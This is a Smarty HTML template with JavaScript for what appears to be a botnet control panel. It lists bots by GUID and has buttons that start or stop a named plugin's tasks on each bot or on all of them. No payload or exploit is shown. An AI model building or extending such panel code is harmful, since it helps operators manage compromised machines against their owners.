{literal}
<script type="text/javascript">
function ajaxPluginsPlayStop(res) {
	if (res.indexOf('Error') == -1 && res.length != 0) {
		var el = document.getElementById('psb' + res);
		if (el) {
			if (el.innerHTML.indexOf('stop') != -1)
				el.innerHTML = "<img border='0' src='img/icos/play_16px.png'>";
			else
				el.innerHTML = "<img border='0' src='img/icos/stop_16px.png'>";
			return true;
		}
	}
	alert('Cannot stop this task\n\n' + res);
}
function taskPlayStop(id) 
{
	$.get('./mod/plugins_playstop.php?id=' + id, ajaxPluginsPlayStop);
}
function pluginsReloadFrame(arg) {
	document.getElementById('bPluginsSubmit').click();
}
</script>
{/literal}

<h2>Plugin: <b>{$PLUGIN}</b></h2>
<table width="200px" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>[Global actions]</th>
<tr>
	<td align='center'>
	<a onClick='PlayPause("{$PLUGIN}", 0);' href='javascript:void();' id="bGlobalStop1"><img border="0" src="img/icos/stop.png"></a>
	<a onClick='PlayPause("{$PLUGIN}", 1);' href='javascript:void();' id="bGlobalPlay1" ><img border="0" src="img/icos/play.png"></a>
	</td>
</tr>
</table>

<form id='frm_bots'>
<table width="400px" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot</th><th style='background: rgb(80,80,80); color: rgb(232,232,232);'>[Actions]</th>

{if isset($SQL)}
<tr align='center'><td colspan='2' align='center'>There are <font style='color:red;'><b>no such bots</b></font> <!--( "{$SQL}" )--> </td></tr></table>
{else}
<tr align='center' style='background: none repeat scroll 0% 0% rgb(140, 140, 140); color: rgb(242, 242, 242);'><td colspan='2'><b>{$CNT}</b> bots</td></tr>

{foreach from=$CONT_ARR item=REC}
	<tr align='center'>
	<input type='hidden' name='bot_id_{$REC.RAND}' value='{$REC.BOT_ID}'>
	<td width='300px'>{$REC.BOT_GUID}</td>
	<td><a id='psb{$REC.ID}' href="#" onclick="taskPlayStop('{$REC.ID}'); return false;"><img border='0' src='{$REC.PLAY_STOP_PIC}'></a></td></tr>
{/foreach}
			
</table></form>
{/if}

{literal}<script>
function PlayPause(plugin, act)
{
	var pdata = $('#frm_bots').serialize(true);
    $.post('./mod/pluginssub.php?act='+act+'&plugin='+plugin, pdata, pluginsReloadFrame);
}
</script>{/literal}
